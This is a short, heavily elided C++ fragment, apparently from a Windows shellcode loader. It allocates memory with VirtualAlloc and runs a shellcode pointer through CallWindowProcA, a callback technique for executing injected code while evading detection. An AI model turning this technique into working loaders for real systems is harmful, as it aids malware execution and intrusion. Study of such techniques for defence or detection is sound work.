...
int main()
{
	...
	void* pEncCodeEmpty = VirtualAlloc(NULL, sizeEmpty, MEM_COMMIT, PAGE_READWRITE);
	...
	int fileloc3 = static_cast<int>(reinterpret_cast<intptr_t>(pEncCodeEmpty));
	...
	std::cout << "[+] Empty Result Space been allocated (RW) at the location: 0x" << std::hex << fileloc2 << std::endl;
	...
	ret = CallWindowProcA((WNDPROC)pShellcode, (HWND)pEncCodeEmpty, (UINT)pEncCode, (WPARAM)encSize, 0);
